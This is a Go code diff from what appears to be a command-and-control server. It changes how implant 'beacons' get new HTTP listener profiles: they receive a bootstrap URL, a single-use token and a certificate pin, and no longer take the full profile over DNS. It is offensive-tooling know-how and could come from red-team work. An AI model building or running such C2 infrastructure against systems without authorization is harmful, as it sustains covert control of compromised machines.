@@ -282,9 +282,35 @@ func (api *APIServer) handleSetBeaconHTTPListeners(w http.ResponseWriter, r *htt
 		api.sendError(w, http.StatusBadRequest, err.Error())
 		return
 	}
-	if err := api.queueTransportUpdate(beaconID, payload); err != nil {
-		api.sendError(w, http.StatusInternalServerError, err.Error())
-		return
+
+	// Hand the beacon a URL and a single-use token, not the profile itself. On DNS
+	// the full document is hundreds of label-sized chunks; the short form is one
+	// or two, and the profile arrives over the HTTP listener it describes.
+	delivered := ""
+	if mode != "dns" && len(listeners) > 0 {
+		bootstrapURL := api.bootstrapURLForListener(listeners[0])
+		if bootstrapURL == "" {
+			api.sendError(w, http.StatusBadRequest, "the selected profile has no reachable bootstrap endpoint")
+			return
+		}
+		token, err := api.db.IssueHTTPProfileToken(beaconID, listeners[0].Name, "", payload)
+		if err != nil {
+			api.sendError(w, http.StatusInternalServerError, err.Error())
+			return
+		}
+		short := buildHTTPProfileTask(bootstrapURL, token, listeners[0].SPKISHA256)
+		if _, err := api.db.CreateTask(beaconID, short, ""); err != nil {
+			api.sendError(w, http.StatusInternalServerError, err.Error())
+			return
+		}
+		delivered = short
+	} else {
+		// DNS mode carries no listener: the full payload is short by definition.
+		if err := api.queueTransportUpdate(beaconID, payload); err != nil {
+			api.sendError(w, http.StatusInternalServerError, err.Error())
+			return
+		}
+		delivered = payload
 	}
 	// Record it before replying: the dashboard reads this back to show which
 	// listeners are active, and the BOF card uses it to decide eligibility.
@@ -299,7 +325,8 @@ func (api *APIServer) handleSetBeaconHTTPListeners(w http.ResponseWriter, r *htt
 		"beacon":    beaconID,
 		"mode":      mode,
 		"listeners": req.Names,
-		"payload":   payload,
+		"payload":   delivered,
+		"delivery":  map[string]string{"mode": mode, "transport": "bootstrap"},
 	})
 }
 
@@ -369,6 +396,7 @@ func httpListenerSpecFromDocument(document string) (HTTPListenerSpec, error) {
 		Auth:           parsed.Auth,
 		TimeoutSecs:    parsed.TimeoutSecs,
 		MaxBodyBytes:   parsed.MaxBodyBytes,
+		BootstrapPath:  bootstrapPathFromURIs(parsed.URIs),
 	}, nil
 }
 
@@ -400,4 +428,15 @@ func (api *APIServer) beaconHTTPListenerNamesFromBuild(beacon Beacon) ([]string,
 		}
 	}
 	return names, true
+}
+
+// bootstrapPathFromURIs reads the profile's hand-off path. uris.bootstrap is the
+// documented place; a profile that does not set it gets the default.
+func bootstrapPathFromURIs(uris map[string][]string) string {
+	for _, path := range uris["bootstrap"] {
+		if strings.TrimSpace(path) != "" {
+			return path
+		}
+	}
+	return ""
 }
